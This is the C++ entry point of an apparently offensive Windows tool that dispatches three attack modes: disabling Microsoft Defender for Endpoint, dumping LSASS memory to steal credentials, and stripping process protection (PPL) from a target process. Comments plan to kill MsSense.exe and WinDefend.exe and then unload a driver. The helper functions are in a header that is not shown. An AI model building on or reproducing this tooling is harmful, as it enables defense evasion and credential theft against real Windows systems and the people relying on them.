// GetSystem.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "LoadDriverAndDisableDefenderATP.h"
#pragma comment(lib,"FltLib.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib,"dbghelp.lib")

int main(int argc, char* argv[]) {
	// modes possible
	// killDefender 1
	// dumpLsass 2
	// killProtect 3 <pid>
	// modes will determine what set of funcs to run
	if (argc < 2) {
		printf("Usage: disablePP.exe <mode> <pid> pid only needed for killProtect Mode & dumpLsass mode\n");
		printf("modes: killDefender = 1\ndumpLsass = 2\nkillProtect = 3\n");
		printf("Example disablePP.exe 3 <lsass Pid> -> After Done run disablePP.exe 2 to perform dump\n");
		return 0;
	}
	int targetPid;
	switch (atoi(argv[1])){
	case 1: {
		printf("::: kill defender mode :::\n");
		printf("::: This doesnt work cause even if i disable ppl on sense service doesnt kill it :( Exiting...:::\n");
		//return killDefenderForEndpoint();
		return 0;
	}
	case 2: {
		printf("::: dumpLsass mode :::\n");
		return dumpLsass();
	}
	case 3: {
		printf("::: killProtection mode :::\n");
		if (argv[2]) {
			targetPid = atoi(argv[2]);
			printf("::: Target pid ->%d :::\n");
			return killProcProtect(targetPid);
		}
		else {
			printf("Pid required for this mode...Exiting\n");
			return 0;
		}
		
		return 0;
	}
	default:
		printf("Usage: disablePP.exe <mode> <pid> pid only needed for killProtect Mode\n");
		printf("modes: killDefender = 1\ndumpLsass = 2\nkillProtect = 3\n");
		return 0;
	}
	// 5. Send pid of MSSense.exe to disable PPL <-
	// 6. Send pid of WinDefend.exe to disable PPL <-
	// 7. Kill MsSense.exe & WinDefend.exe
	// 8. unload turtle driver
	// 9. other cleanup?
	return 0;
}

/*
* https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html <-
* http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/ <--
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltunloadfilter
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_filter_unload_callback

Minifilter drivers are not required to register a FilterUnloadCallback routine.
However, registering an unload routine is strongly recommended.
If a minifilter driver does not register a FilterUnloadCallback routine, it cannot be unloaded. <-----
*/

/*
You only need to enable the debug privilege if you want to debug system level processes (i.e. services).
If you are debugging non-system level processes enabling this flag gains you nothing
*/